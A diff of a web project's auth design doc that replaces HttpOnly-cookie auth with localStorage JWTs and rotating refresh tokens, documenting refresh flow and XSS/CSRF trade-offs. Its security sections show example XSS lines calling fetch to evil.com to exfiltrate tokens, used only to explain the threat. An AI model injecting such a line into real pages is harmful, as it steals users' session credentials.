@@ -1,133 +1,109 @@
-# Auth Architecture — HttpOnly Cookie vs JWT in localStorage
+# Auth Architecture — JWT in localStorage with Refresh Tokens
 
-## The Core Difference: Who Holds the Token?
-
-### JWT in localStorage (common pattern — NOT what this backend uses)
+## How Auth Works
 
 ```
-1. Login → server returns { token: "eyJhb..." }
-2. Frontend stores it: localStorage.setItem("token", "eyJhb...")
+1. Login → server returns { token: "eyJhb...", refreshToken: "opaque..." }
+2. Frontend stores both: localStorage("auth_token"), localStorage("refresh_token")
 3. Every request: Authorization: Bearer eyJhb...
-4. Logout: localStorage.removeItem("token")
-```
-
-JavaScript owns the token. It can read it, copy it, and send it anywhere.
-
----
-
-### HttpOnly cookie (what this backend uses)
-
-```
-1. Login → server returns 200 + Set-Cookie: __Host-Nexus-Auth=eyJhb...; HttpOnly
-2. Browser stores it automatically — JS cannot read it at all
-3. Every request: browser attaches cookie automatically (withCredentials: true)
-4. Logout: POST /api/auth/logout → server clears the cookie
-```
-
-The **browser** owns the token. JavaScript cannot touch it — not even `document.cookie` can see it.
-
----
-
-## Why HttpOnly Is Safer
-
-The attack this prevents is **XSS (Cross-Site Scripting)**:
-
-```js
-// Attacker injects this script into your page:
-fetch("https://evil.com/steal?token=" + localStorage.getItem("token"))
-// → JWT stolen, attacker impersonates the user forever
-```
-
-With HttpOnly cookies, the same attack fails:
-
-```js
-fetch("https://evil.com/steal?token=" + document.cookie)
-// → __Host-Nexus-Auth is invisible to JS → empty string → attack dead
+4. Token expired → POST /auth/refresh → rotate both tokens, retry original request
+5. Logout: clear both tokens from localStorage, redirect to /login
 ```
 
 ---
 
-## What `withCredentials: true` Does
+## Token Lifetimes
 
-By default, browsers don't send cookies on cross-origin requests. The frontend runs on `localhost:5173`, the API on `localhost:7289` — different ports = different origin.
-
-```ts
-// Without withCredentials — cookie NOT sent:
-axios.get("https://localhost:7289/api/properties")
-
-// With withCredentials — cookie IS sent automatically:
-const api = axios.create({ withCredentials: true })
-```
-
-This single config change replaces the entire `Authorization: Bearer` interceptor. Every request behaves like a browser navigation — the cookie goes along automatically.
+| Token | Storage | Lifetime | Notes |
+|---|---|---|---|
+| Access token (JWT) | `localStorage` → `auth_token` | 60 min (configurable) | Attached as `Authorization: Bearer` |
+| Refresh token (opaque) | `localStorage` → `refresh_token` | 7 days | Single-use — rotates on every refresh |
 
 ---
 
-## Why No Zustand `persist` Middleware
+## Silent Token Refresh Flow
 
-In the localStorage approach, Zustand holds the token — so it must persist across page refreshes.
+The axios response interceptor in `apiClient.ts` handles expiry transparently:
 
-With cookies, the cookie survives refreshes on its own (the browser keeps it). Zustand only needs to know **who is logged in**, not the credential itself.
+```
+Any request → 401
+  ├─ Is an /auth/* endpoint? → reject immediately (no retry loop)
+  ├─ No refresh token stored? → clear tokens, redirect to /login
+  ├─ Refresh already in flight? → queue this request, wait for new token
+  └─ Otherwise:
+       POST /auth/refresh { refreshToken }
+         ├─ 200 → store new token + refreshToken, drain queue, retry original request ✓
+         └─ 401 → clear tokens, redirect to /login
+```
 
-Rehydration flow on every app load:
+Concurrent requests that 401 while a refresh is in flight are queued and replayed once the new token arrives — only one refresh call is ever made.
+
+---
+
+## App Load — Rehydration
 
 ```
 App mounts
-  → authStore.initialize() fires
-  → GET /api/auth/me  (browser sends cookie automatically)
-  → 200: set user = { userId, email }, isAuthenticated = true
-  → 401: set user = null, isAuthenticated = false
-  → isInitializing = false → app renders
+  → useCurrentUser fires (React Query)
+  → GET /auth/me  (Authorization: Bearer <stored access token>)
+  → 200: user state restored ✓
+  → 401 (access token expired): interceptor calls POST /auth/refresh
+       → 200: tokens rotated, /auth/me retried ✓
+       → 401: redirect to /login
 ```
 
-> `AuthGuard` must wait for `isInitializing` to be false before redirecting. If it redirects to `/login` before `GET /me` finishes, every refresh would kick logged-in users out.
+`/auth/me` is a no-database JWT claims read — fast and cheap. It is the happy-path rehydration call. The refresh flow is the silent fallback.
 
 ---
 
-## The Trade-off: CSRF vs XSS
-
-| Attack | localStorage + Bearer | HttpOnly cookie |
-|---|---|---|
-| XSS | Vulnerable — JS can steal the token | Safe — JS can't read the cookie |
-| CSRF | Safe — Bearer must be set explicitly | Mitigated by `SameSite: Strict` |
-
-`SameSite: Strict` means the cookie is only sent when the request originates from your own domain. A malicious third-party page cannot trigger requests with your cookie attached.
-
----
-
-## Frontend State Shape
-
-Because the token never reaches the frontend, the auth store holds only identity — not credentials:
+## Token Storage (`src/utils/tokenStorage.ts`)
 
 ```ts
-// localStorage / Bearer approach:
-{
-  token: string | null,       // the JWT itself
-  user: { id, email, name, role } | null,
-  isAuthenticated: boolean,
-}
-
-// HttpOnly cookie approach (this project):
-{
-  user: { userId: string; email: string } | null,
-  isAuthenticated: boolean,
-  isInitializing: boolean,    // true while GET /me is in flight on app load
-}
+tokenStorage.get()                         // read access token
+tokenStorage.getRefreshToken()             // read refresh token
+tokenStorage.setTokens(token, refresh)    // store both after login/register/refresh
+tokenStorage.clear()                       // remove both on logout
 ```
 
-No token field. No persist. No interceptor injecting headers.
+---
+
+## Security Trade-offs
+
+### XSS
+
+Storing JWTs in `localStorage` means JavaScript can read them. An XSS attack can extract the token:
+
+```js
+fetch("https://evil.com/steal?t=" + localStorage.getItem("auth_token"))
+```
+
+Mitigations in place:
+- React's JSX escaping prevents most reflected/stored XSS
+- Content Security Policy (CSP) headers on the server reduce injection surface
+- Short access token lifetime (60 min) limits the damage window
+- Refresh token rotation means a stolen refresh token can only be used once before it's invalidated
+
+### CSRF
+
+Not a concern for Bearer token auth — cookies are not used, so there is nothing for a cross-site request to attach automatically.
+
+---
+
+## What Is NOT Used
+
+- **HttpOnly cookies** — the original design used `__Host-Nexus-Auth` cookies with `withCredentials: true`. The backend was updated to JWT bearer tokens.
+- **Zustand `authStore`** — the original design used a Zustand store with `initialize()` / `login()` / `logout()` actions. The current implementation uses React Query (`useCurrentUser`) and plain hooks (`useLogout`).
+- **`withCredentials: true`** — not needed; Bearer tokens are attached explicitly by the request interceptor.
 
 ---
 
 ## Mental Model
 
-> **localStorage auth:** "I carry my ID card and show it at every door."
-
-> **HttpOnly cookie auth:** "The building gave me a wristband I can't remove or read — scanners see it automatically."
+> **JWT localStorage auth:** "I carry my ID card and show it at every door. When it expires, reception issues a new one automatically and I keep walking."
 
 ---
 
 ## See Also
 
-- [`docs/backend-auth.md`](./backend-auth.md) — API endpoints, request/response shapes, error codes, cookie details
-- [`docs/auth-summary.md`](./auth-summary.md) — original frontend auth system design notes (written before backend spec was known; some details are now superseded by this doc)
+- [`docs/backend-auth.md`](./backend-auth.md) — API endpoints, request/response shapes, error codes
+- [`docs/frontend-auth-summary.md`](./frontend-auth-summary.md) — frontend file map, hooks, and flow
